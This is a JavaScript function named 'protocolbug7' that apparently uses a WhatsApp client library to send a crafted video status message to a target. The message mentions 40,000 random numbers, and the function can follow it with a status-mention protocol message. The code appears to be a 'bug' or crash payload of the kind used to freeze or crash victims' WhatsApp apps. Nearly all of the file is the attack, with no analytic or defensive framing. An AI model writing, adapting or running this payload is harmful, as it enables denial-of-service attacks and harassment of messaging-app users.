async function protocolbug7(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7161-24/40250319_1075386694686673_1768523387123599748_n.enc?ccb=11-4&oh=01_Q5Aa2AE1t9DMQhEFso76AXELYA2KPZDqX_Dmsh72iVgEWrJ66Q&oe=68A43675&_nc_sid=5e03e0&mms3=true";
  const mime = "video/mp4";
  const sha = [142,71,147,252,29,144,234,115,142,111,245,159,120,141,201,69,48,108,131,112,86,123,207,145,206,186,23,72,9,150,13,180];
  const enc = [81,216,100,239,0,195,79,186,2,20,52,6,21,101,143,151,160,242,125,71,9,168,54,225,14,84,36,7,67,111,179,117];
  const key = [1,153,62,77,45,173,152,96,229,35,118,185,88,126,191,170,126,38,94,167,128,33,113,151,35,248,248,164,87,18,29,245];
  const timestamp = 1753008470;
  const path = "/v/t62.7161-24/40250319_1075386694686673_1768523387123599748_n.enc?ccb=11-4&oh=01_Q5Aa2AE1t9DMQhEFso76AXELYA2KPZDqX_Dmsh72iVgEWrJ66Q&oe=68A43675&_nc_sid=5e03e0";
  const fileLength = 762050;
  const seconds = 9;
  const height = 1024;
  const width = 576;
  const jpegThumbnail = [255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,219,0,132,0,27,27,27,27,28,27,30,33,33,30,42,45,40,45,42,61,56,51,51,56,61,93,66,71,66,71,66,93,141,88,103,88,88,103,88,141,125,151,123,115,123,151,125,224,176,156,156,176,224,255,217,206,217,255,255,255,255,255,255,255,255,255,255,255,1,27,27,27,27,28,27,30,33,33,30];
  const streamingSidecar = [70,54,120,69,91,94,162,255,226,32,138,102,36,72,114,23,71,144,110,6,58,35,31,181,73,161,168,75,49,180,152,42,175,215,237,214,172,173,173,198,44,245,140,144,88,162,122,125,213,252,202,202,11,126,249,58,62,27,36,41,48,184,13,92,122,197,173,234,57,21,97,124,113,250,224,113,93,193,229,215,205,61,127,179,227,217,154,25,61,165,57,238,168,117,232,159,207,86,77,255];

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: ""
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        videoMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: fileLength,
          seconds: seconds,
          mediaKey: key,
          height: height,
          width: width,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          jpegThumbnail: jpegThumbnail,
          streamingSidecar: streamingSidecar
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const huangproto = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sock.relayMessage("status@broadcast", msg.message, huangproto);

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: "true"
        },
        content: undefined
      }]
    });
  }
}